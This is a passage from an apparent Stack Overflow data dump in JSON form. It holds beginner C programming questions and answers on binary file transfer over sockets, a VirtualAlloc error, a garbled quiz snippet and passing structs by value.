{"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437584538, "post_id": 31569425, "comment_id": 51094049, "body": "&#39;buf[numbytes] = &#39;\\0&#39;; pointless with binary data that may contain shellfish."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437585927, "post_id": 31569425, "comment_id": 51094871, "body": "Sending <code>MAXDATASIZE-1</code> bytes regardless of the actual number of bytes in the file is a really poor idea.  It&#39;s wasteful for files that are smaller, and it truncates files that are larger."}, {"owner": {"reputation": 15, "user_id": 5029738, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-QCx41_me2Co/AAAAAAAAAAI/AAAAAAAAAGs/zXJfQHvcvis/photo.jpg?sz=128", "display_name": "Thrinai Nani", "link": "https://stackoverflow.com/users/5029738/thrinai-nani"}, "edited": false, "score": 0, "creation_date": 1437587669, "post_id": 31569425, "comment_id": 51095895, "body": "what is nullterminated string ?"}, {"owner": {"reputation": 15, "user_id": 5029738, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-QCx41_me2Co/AAAAAAAAAAI/AAAAAAAAAGs/zXJfQHvcvis/photo.jpg?sz=128", "display_name": "Thrinai Nani", "link": "https://stackoverflow.com/users/5029738/thrinai-nani"}, "edited": false, "score": 0, "creation_date": 1437587755, "post_id": 31569425, "comment_id": 51095939, "body": "how is it related to recv()  I am using \t printf(&quot;\\nremotefile in val1 is %s\\n&quot;,remotefile);&#39; to print how does it effect the recv()"}, {"owner": {"reputation": 6823, "user_id": 2382728, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/ILv9S.jpg?s=128&g=1", "display_name": "Philip Stuyck", "link": "https://stackoverflow.com/users/2382728/philip-stuyck"}, "edited": false, "score": 1, "creation_date": 1437589518, "post_id": 31569425, "comment_id": 51097026, "body": "What is a nullterminated string ? If you don&#39;t know that you should not be trying to program sockets yet. First try a book on programming for beginners. You are most likely copy pasting pieces of code that you don&#39;t understand at all."}, {"owner": {"reputation": 15, "user_id": 5029738, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-QCx41_me2Co/AAAAAAAAAAI/AAAAAAAAAGs/zXJfQHvcvis/photo.jpg?sz=128", "display_name": "Thrinai Nani", "link": "https://stackoverflow.com/users/5029738/thrinai-nani"}, "edited": false, "score": 0, "creation_date": 1437596042, "post_id": 31569425, "comment_id": 51101031, "body": "I know what is null terminating string but I cant understand how does it related to recv()"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437651195, "post_id": 31569425, "comment_id": 51124266, "body": "^^ You understand that binary data, in general, may contain nulls, yes?  OK, so can you understand why using library calls that require null-terminated char arrays will be unreliable when applied to such data?"}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437585692, "post_id": 31569747, "comment_id": 51094747, "body": "Also, <code>recv()</code> is not guaranteed to receive all the incoming data in one call, even if there is enough space in the buffer.  You need some sort of application-level protocol to indicate how much data to read, and you need to keep reading until you read that much.  (Such a protocol could be as simple as the client closing the connection when all bytes have been sent.  I guess it actually does that, but the server does not necessarily read to the end of the stream.)"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437585813, "post_id": 31569747, "comment_id": 51094801, "body": "Also also, similar applies to sending."}, {"owner": {"reputation": 15, "user_id": 5029738, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-QCx41_me2Co/AAAAAAAAAAI/AAAAAAAAAGs/zXJfQHvcvis/photo.jpg?sz=128", "display_name": "Thrinai Nani", "link": "https://stackoverflow.com/users/5029738/thrinai-nani"}, "edited": false, "score": 0, "creation_date": 1437587796, "post_id": 31569747, "comment_id": 51095967, "body": "Can u please give me any idea about how to do it"}], "tags": [], "owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "is_accepted": true, "score": 1, "last_activity_date": 1437585130, "creation_date": 1437585130, "answer_id": 31569747, "question_id": 31569425, "link": "https://stackoverflow.com/questions/31569425/prob-with-binary-files-using-sockets/31569747#31569747", "title": "Prob with binary files using sockets", "body": "<p>Go through ALL your code and fix/change ALL the places where you:</p>\n\n<ul>\n<li>don't correctly handle the results returned by system calls like\nrecv().  If a positive value is returned, that value is the ONLY safe\nway of finding out how much data has been read into the buffer.</li>\n<li>Get rid of all the strlen(), printf(\"%s...) etc. that are either\nuseless, (the binary data may contain nulls and so the action will\ncomplete early), or dangerous, (binary data contains no nulls at all\nand so the calls are UB).</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 6823, "user_id": 2382728, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/ILv9S.jpg?s=128&g=1", "display_name": "Philip Stuyck", "link": "https://stackoverflow.com/users/2382728/philip-stuyck"}, "is_accepted": false, "score": 0, "last_activity_date": 1437588833, "creation_date": 1437588833, "answer_id": 31570912, "question_id": 31569425, "link": "https://stackoverflow.com/questions/31569425/prob-with-binary-files-using-sockets/31570912#31570912", "title": "Prob with binary files using sockets", "body": "<p>Following logic for receiving a file is already a lot better than what you have. But there are a lot more problems with your code than just this :</p>\n\n<pre><code> FILE *received_file;\n received_file = fopen(FILENAME, \"w\");\n ...\n //copy logic, copies data received from the socket into the file as is.\n while (((len = recv(client_socket, buffer, BUFSIZ, 0)) &gt; 0))\n    {\n            fwrite(buffer, sizeof(char), len, received_file);\n    }\n    fclose(received_file);\n   close(client_socket);\n</code></pre>\n\n<p>The receive is continuously called until your receive 0 or a negative number, if you receive 0 that means you need to close the socket because the transfer is finished and the peer has closed its end of the connection too.\nThe file handle should be created right after accept.</p>\n\n<p>Bottom line is that your code needs a total revision because it is too lengthy for what it is supposed to do, and it is based on totally wrong assumptions. Read first about network programming before attempting anything like this. Socket programming is an advanced topic, without proper understanding you will fail.</p>\n"}], "owner": {"reputation": 15, "user_id": 5029738, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-QCx41_me2Co/AAAAAAAAAAI/AAAAAAAAAGs/zXJfQHvcvis/photo.jpg?sz=128", "display_name": "Thrinai Nani", "link": "https://stackoverflow.com/users/5029738/thrinai-nani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "accepted_answer_id": 31569747, "answer_count": 2, "score": 0, "last_activity_date": 1437588833, "creation_date": 1437584078, "question_id": 31569425, "link": "https://stackoverflow.com/questions/31569425/prob-with-binary-files-using-sockets", "title": "Prob with binary files using sockets", "body": "<p>This is not the total code.</p>\n\n<p>This is working fine for normal files like text files, but not working for tar.gz and binary files transfer please help me.</p>\n\n<p>And how to send the chunks of memory using sockets.</p>\n\n<p>server.c</p>\n\n<pre><code>void main()\n{\nint sockfd, new_fd;  // listen on sock_fd, new connection on new_fd\nstruct sockaddr_in my_addr; // my address information\nstruct sockaddr_in their_addr; // connector's address information\nsocklen_t sin_size;\nstruct sigaction sa;\nint yes=1;\nchar buf[16384];\nchar remotefile[MAXDATASIZE];\nif ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)\n{\n    perror(\"socket\");\n    exit(1);\n}\n\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int)) == -1) \n{\n    perror(\"setsockopt\");\n    exit(1);\n}\n\nmy_addr.sin_family = AF_INET;        // host byte order\nmy_addr.sin_port = htons(MYPORT);    // short, network byte order\nmy_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\nmemset(my_addr.sin_zero, '\\0', sizeof my_addr.sin_zero);\n\nprintf(\"call binding\\n\");\nif (bind(sockfd, (struct sockaddr *)&amp;my_addr, sizeof my_addr) == -1) \n{\n    perror(\"bind\");\n    exit(1);\n}\n\nif (listen(sockfd, BACKLOG) == -1) \n{\n    perror(\"listen\");\n    exit(1);\n}\n\nsa.sa_handler = sigchld_handler; // reap all dead processes\nsigemptyset(&amp;sa.sa_mask);\nsa.sa_flags = SA_RESTART;\nif (sigaction(SIGCHLD, &amp;sa, NULL) == -1) \n{\n    perror(\"sigaction\");\n    exit(1);\n}\n\nwhile(1)\n{  // main accept() loop\n    sin_size = sizeof their_addr;\n    if ((new_fd = accept(sockfd, (struct sockaddr *)&amp;their_addr, &amp;sin_size)) == -1) \n    {\n        perror(\"accept\");\n        exit(1);\n        continue;\n    }\n    printf(\"server: got connection from %s\\n\",inet_ntoa(their_addr.sin_addr));\n    if (!fork()) \n    { // this is the child process\nif ((byt=recv(new_fd, remotefile, MAXDATASIZE-1, 0)) == -1) \n            {\n                perror(\"server recv\");\n                exit(1);\n            }\n        int serverfile_fd;\n        size_t result;\n        printf(\"\\nremotefile in val1 is %s\\n\",remotefile);\n\n        if((serverfile_fd = open(remotefile,O_RDONLY)) &lt; 0)\n        {\n            printf(\"error at remotefile\\n\");\n            exit(1);\n        }\n\n        else\n         {  \n            read(serverfile_fd, &amp;buf[0], sizeof(buf));\n         }\n        //printf(\"file is\\n%s\", buf);\n        /* 3. sending  buf in val 0*/\n        if (send(new_fd, buf, 16384, 0) == -1)\n            perror(\"send\");\n        close(new_fd);\n        exit(0);\n    }\n</code></pre>\n\n<p>client.c</p>\n\n<pre><code>int remote_to_local(const  char *remotehost,const  char *remotefile,const  char *localfile)\n{\n\nint sockfd, numbytes,i = 0,j = 0;  \nchar buf[16384];\nstruct hostent *he;\nstruct sockaddr_in s_addr; // connector's address information \nprintf(\"\\n\");\nprintf(\"Remotehost is %s\\n\", remotehost);\nif ((he=gethostbyname(remotehost)) == NULL) \n{  // get the host info \n    perror(\"gethostbyname\");\n    exit(1);\n}\n\nif ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) \n{\n    perror(\"socket\");\n    exit(1);\n}\n\ns_addr.sin_family = AF_INET;    // host byte order \ns_addr.sin_port = htons(PORT);  // short, network byte order \ns_addr.sin_addr = *((struct in_addr *)he-&gt;h_addr);\n//inet_aton(he-&gt;h_addr, &amp;s_addr.sin_addr);\nmemset(s_addr.sin_zero, '\\0', sizeof s_addr.sin_zero);\n\nif (connect(sockfd, (struct sockaddr *)&amp;s_addr, sizeof s_addr) == -1) \n{\n    perror(\"connect\");\n    exit(1);\n}\n\n//send(sockfd, remotefile, MAXDATASIZE-1, 0);\nval[0] = 1;\nprintf(\"Val 0 is %d\\n\", val[0]);\nprintf(\"Val 1 is %d\\n\", val[1]);\n        /*1 sending val in r to l*/\nif (send(sockfd, val, MAXDATASIZE-1, 0) == -1)\n            perror(\"send\");\n\nprintf(\"remotefile is %s\\n\",remotefile);\n\n/* 2 sending remotefile in r to l*/\nif (send(sockfd, remotefile, MAXDATASIZE-1, 0) == -1)\n            perror(\"send\");\n/* 3. recieve buf in r to l */  \nif ((numbytes=recv(sockfd, buf, 16384, 0)) == -1) \n{\n    perror(\"recv\");\n    exit(1);\n}\n\nbuf[numbytes] = '\\0';\n\n//printf(\"Received: \\n%s\",buf);\n\n\nint clientfile_fd;\nprintf(\"Local file is %s\\n\",localfile);\nif((clientfile_fd = open(localfile,O_CREAT|O_WRONLY,0777)) &lt; 0)\n    {\n       printf(\"error at remotefile\\n\");\n        exit(1);\n    }\n   else\n   {    \n        //read(clientfile_fd, &amp;buf[0], sizeof(buf));\n         int  result = strlen(buf); \n         //printf(\"Result size is %d\\n\",result);\n         open(localfile,O_TRUNC);\n         write(clientfile_fd, &amp;buf[0], result);\n   }\n\nclose(sockfd);\n\n\nreturn 0;\n  }\n</code></pre>\n"}, {"tags": ["c++", "c", "qt", "winapi"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437583611, "post_id": 31569078, "comment_id": 51093524, "body": "Well, there is only one relevant parameter, and you are not displaying it or logging it?"}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 5, "creation_date": 1437583632, "post_id": 31569078, "comment_id": 51093534, "body": "You might want to include FizeSize in the warning message to verify if you&#39;re assumptions about it are correct."}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 2, "creation_date": 1437598426, "post_id": 31569078, "comment_id": 51102476, "body": "You should also double-check the error code; the code as posted isn&#39;t reliable in that respect.  You need to retrieve the error code first, stick it in a variable, and only then construct your warning message."}], "owner": {"reputation": 55, "user_id": 5018855, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5152fdb6e4e7c87797580deea71f2fb?s=128&d=identicon&r=PG&f=1", "display_name": "legitberg", "link": "https://stackoverflow.com/users/5018855/legitberg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1146, "favorite_count": 1, "answer_count": 0, "score": 2, "last_activity_date": 1437583136, "creation_date": 1437583136, "question_id": 31569078, "link": "https://stackoverflow.com/questions/31569078/virtual-alloc-failing-with-code-87-invalid-parameter", "title": "Virtual Alloc failing with code 87 - Invalid parameter", "body": "<p>following code is working on some PCs, while on other giving error 87 - invalid parameter, what can be wrong?</p>\n\n<pre><code>FileSize = dwDllSize;\nbuffer = VirtualAlloc ( NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );\n\nif ( !buffer )\n{\n    QMessageBox::warning(NULL,QString(\"VirtualAlloc failed!\"),QString::number(GetLastError()));\n    return -1;\n}\n</code></pre>\n\n<p>I'm checking for size 0, and file is not bigger than ~200kb.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1437583115, "post_id": 31568961, "comment_id": 51093230, "body": "Maybe it is possible ."}, {"owner": {"reputation": 246, "user_id": 4286300, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/beee74edca1edd54a08ca79082b535b2?s=128&d=identicon&r=PG&f=1", "display_name": "nom", "link": "https://stackoverflow.com/users/4286300/nom"}, "edited": false, "score": 0, "creation_date": 1437583167, "post_id": 31568961, "comment_id": 51093271, "body": "There is no symbol <code>lt</code> so it seems that it should be a compilation error, unless that it means something in the compiler used (implementation defined). The same is also true for <code>p</code>."}, {"owner": {"reputation": 69, "user_id": 4998084, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36d2eed195d677751d8425e642d3f076?s=128&d=identicon&r=PG&f=1", "display_name": "normal", "link": "https://stackoverflow.com/users/4998084/normal"}, "reply_to_user": {"reputation": 246, "user_id": 4286300, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/beee74edca1edd54a08ca79082b535b2?s=128&d=identicon&r=PG&f=1", "display_name": "nom", "link": "https://stackoverflow.com/users/4286300/nom"}, "edited": false, "score": 0, "creation_date": 1437584754, "post_id": 31568961, "comment_id": 51094184, "body": "@NabeelOmer did u see the link in the question??"}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 2, "last_activity_date": 1437585756, "creation_date": 1437585756, "answer_id": 31569940, "question_id": 31568961, "link": "https://stackoverflow.com/questions/31568961/reasons-for-compilation-error/31569940#31569940", "title": "Reasons for compilation error", "body": "<p>The</p>\n\n<pre><code>&amp;lt;p&lt;&lt;k\n}\n</code></pre>\n\n<p>is probably there by accident. It's gibberish. Leaving it out, you should get an error, because a is not a pointer. You can't increment an array.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user1157391"}, "is_accepted": true, "score": 3, "last_activity_date": 1437585772, "creation_date": 1437585772, "answer_id": 31569946, "question_id": 31568961, "link": "https://stackoverflow.com/questions/31568961/reasons-for-compilation-error/31569946#31569946", "title": "Reasons for compilation error", "body": "<p>The last two lines are obviously not supposed to be there. This question is about the differences between arrays and pointers. You already found the answer: <em>a</em> is an array, not a pointer, and can therefore not be post-incremented.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 5145003, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uf2znqBJF0E/AAAAAAAAAAI/AAAAAAAAAKQ/aweCpYy3R9E/photo.jpg?sz=128", "display_name": "Varun R R", "link": "https://stackoverflow.com/users/5145003/varun-r-r"}, "is_accepted": false, "score": 0, "last_activity_date": 1437590787, "creation_date": 1437590787, "answer_id": 31571532, "question_id": 31568961, "link": "https://stackoverflow.com/questions/31568961/reasons-for-compilation-error/31571532#31571532", "title": "Reasons for compilation error", "body": "<pre><code> &amp;lt;p&lt;&lt;k \n</code></pre>\n\n<p>The above code might have occurred due to some improper closing of tags/fields in their HTML code.The following has no relation with the above c program.This program makes us understand that arrays can be accessed as pointers. </p>\n"}], "owner": {"reputation": 69, "user_id": 4998084, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/36d2eed195d677751d8425e642d3f076?s=128&d=identicon&r=PG&f=1", "display_name": "normal", "link": "https://stackoverflow.com/users/4998084/normal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 216, "favorite_count": 0, "accepted_answer_id": 31569946, "answer_count": 3, "score": 1, "last_activity_date": 1437590787, "creation_date": 1437582794, "last_edit_date": 1592644375, "question_id": 31568961, "link": "https://stackoverflow.com/questions/31568961/reasons-for-compilation-error", "title": "Reasons for compilation error", "body": "<p><a href=\"https://i.stack.imgur.com/eX0mE.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/eX0mE.jpg\" alt=\"enter image description here\" /></a></p>\n<p>The HackerEarth facebook page uploads MCQs like these everyday! So, I suppose that I can share this image here. It seems to me like its a compilation error! Because of the fact that there is a statement the post-increments the <code>char</code> array <code>a</code> in the <code>for</code> loop!\nBut last 2 statements::</p>\n<pre><code>&amp;lt;p&lt;&lt;k\n}\n</code></pre>\n<p>Are they valid in any way? <a href=\"https://stackoverflow.com/questions/1011392/are-converted-to-gt-lt-etc\">&lt; &amp; &gt; are converted to &amp;gt; &amp;lt; etc</a> This link says that <code>&lt;</code> gets converted to <code>&amp;lt;</code>! Or is it also a compiler error?</p>\n<p>Was just curious because I couldn't trust myself that a compilation error as an extra closing bracket and a <code>&amp;lt;p&lt;&lt;k;</code> statement could be there in a question!</p>\n"}, {"tags": ["c", "struct", "stack"], "comments": [{"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 1, "creation_date": 1437582398, "post_id": 31568778, "comment_id": 51092805, "body": "C uses pass by value. <code>Person_create()</code> doesn&#39;t modify the struct you pass in \u2013 it modifies a local copy."}, {"owner": {"reputation": 18466, "user_id": 477563, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/07a89fb7b2fd8ece1e9e39e95e004a36?s=128&d=identicon&r=PG", "display_name": "Mr. Llama", "link": "https://stackoverflow.com/users/477563/mr-llama"}, "edited": false, "score": 4, "creation_date": 1437582443, "post_id": 31568778, "comment_id": 51092829, "body": "Go back and read <a href=\"http://c.learncodethehardway.org/book/ex4.html\" rel=\"nofollow noreferrer\">chapter 4</a> on using Valgrind.  It&#39;ll help you find the issue.  In addition, skip ahead and read to <a href=\"http://c.learncodethehardway.org/book/ex31.html\" rel=\"nofollow noreferrer\">chapter 31</a> on debugging."}, {"owner": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 1, "creation_date": 1437583136, "post_id": 31568778, "comment_id": 51093250, "body": "I&#39;ve just read the question, the idea here is to not use pointers at all so the Person_create should return the structure and you shouldn&#39;t be passing a pointer to it as an argument. You can create a local instance of the structure and return it as it will pass a copy back to the caller (so no refering to stack variables that heve been destroyed). Apart from that, it looks OK but doing strings without using pointers will be tricky (and I don&#39;t think they want you to try either)."}, {"owner": {"reputation": 64226, "user_id": 1898, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e222c924e06cc579a6866f6d7588ca66?s=128&d=identicon&r=PG", "display_name": "Skizz", "link": "https://stackoverflow.com/users/1898/skizz"}, "edited": false, "score": 0, "creation_date": 1437583277, "post_id": 31568778, "comment_id": 51093336, "body": "I should add that this isn&#39;t really good practice, using pointers (or references!) is a better way to do it, but hopefully you&#39;ll learn something useful here."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437586049, "post_id": 31568778, "comment_id": 51094956, "body": "Maybe instead of <code>void Person_create(....</code> use <code>struct Person Person_create(char *name, int age, int height, int weight) { return (struct Person ) { name, age, height, weight } ; }</code>"}], "answers": [{"comments": [{"owner": {"reputation": 145, "user_id": 4013658, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7732ca2ed411624b55cc05097790bfe7?s=128&d=identicon&r=PG&f=1", "display_name": "Amir", "link": "https://stackoverflow.com/users/4013658/amir"}, "edited": false, "score": 0, "creation_date": 1437582752, "post_id": 31568839, "comment_id": 51093012, "body": "I understand, perhaps I might have misunderstood what the extra credit was asking for but I think it wants me to get away from the using pointers like that."}, {"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "reply_to_user": {"reputation": 145, "user_id": 4013658, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7732ca2ed411624b55cc05097790bfe7?s=128&d=identicon&r=PG&f=1", "display_name": "Amir", "link": "https://stackoverflow.com/users/4013658/amir"}, "edited": false, "score": 2, "creation_date": 1437582950, "post_id": 31568839, "comment_id": 51093129, "body": "@Amir Are you sure? Or maybe it just want you to do that without dynamic allocation?"}, {"owner": {"reputation": 145, "user_id": 4013658, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7732ca2ed411624b55cc05097790bfe7?s=128&d=identicon&r=PG&f=1", "display_name": "Amir", "link": "https://stackoverflow.com/users/4013658/amir"}, "edited": false, "score": 0, "creation_date": 1437584480, "post_id": 31568839, "comment_id": 51094017, "body": "It is asking for me to not use pointers or malloc, and says as advice to look into creating a struct on the stack."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 4, "last_activity_date": 1437584757, "last_edit_date": 1437584757, "creation_date": 1437582420, "answer_id": 31568839, "question_id": 31568778, "link": "https://stackoverflow.com/questions/31568778/changing-a-struct-on-the-stack-inside-function/31568839#31568839", "title": "Changing a struct on the stack inside function", "body": "<p>The reason your code produces errors at runtime is that C passes <code>struct</code>s by value, meaning that the following assignments inside <code>Person_create</code> have no effect:</p>\n\n<pre><code>p.name = name;\np.age = age;\np.height = height;\np.weight = weight;\n</code></pre>\n\n<p>This makes no changes to <code>joe</code> and <code>frank</code> inside <code>main()</code>, leading to undefined behavior on printing, because <code>name</code> data member of the <code>struct Person</code> remains uninitialized.</p>\n\n<p>In order to fix this problem, pass <code>struct Person</code> by pointer, and apply <code>-&gt;</code> operator in place of <code>.</code> operator:</p>\n\n<pre><code>void Person_create(struct Person *p,char *name,int age,int height,int weight)\n{\n    p-&gt;name = name;\n    p-&gt;age = age;\n    p-&gt;height = height;\n    p-&gt;weight = weight;\n}\n...\nPerson_create(&amp;joe, \"Joe Alex\", 32, 64, 140);\n//            ^ Pass an address\n</code></pre>\n\n<blockquote>\n  <p>It is asking for me to not use pointers or malloc, and says as advice to look into creating a struct on the stack</p>\n</blockquote>\n\n<p>Your code already creates the <code>struct</code>s on the stack. If you would like to get rid of pointers completely, change <code>Person_create</code> to *return` a new person, like this:</p>\n\n<pre><code>struct Person Person_create(char *name,int age,int height,int weight) {\n    struct Person p;\n    p.name = name;\n    p.age = age;\n    p.height = height;\n    p.weight = weight;\n    return p;\n}\n...\njoe = Person_create(\"Joe Alex\", 32, 64, 140);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "edited": false, "score": 0, "creation_date": 1437584436, "post_id": 31568923, "comment_id": 51093989, "body": "you can use <code>strdup</code> to copy strings. That&#39;s standard and less liable to off by one errors and suchlike"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "edited": false, "score": 0, "creation_date": 1437584862, "post_id": 31568923, "comment_id": 51094256, "body": "@Tom Tanner strdup is not a C standard function. It is a POSIX function."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437586323, "post_id": 31568923, "comment_id": 51095116, "body": "Nice <code>const</code> catch. +1  Suggest also: <code>size_t sz = strlen(name)+1; p-name = memcpy(malloc(sz), name, sz);</code>"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437586837, "post_id": 31568923, "comment_id": 51095425, "body": "@chux A similar record could be written using strcpy: p-&gt;name = strcpy( malloc( sz ), name );"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437587126, "post_id": 31568923, "comment_id": 51095609, "body": "Nice, could even the use <code>p-&gt;name = strcpy(malloc( strlen(name)+1), name );</code> but that becomes a bit unreadable.   In my experience, I found <code>memcpy()</code> to be significantly faster that <code>strcpy()</code> and worth coding that way.  <a 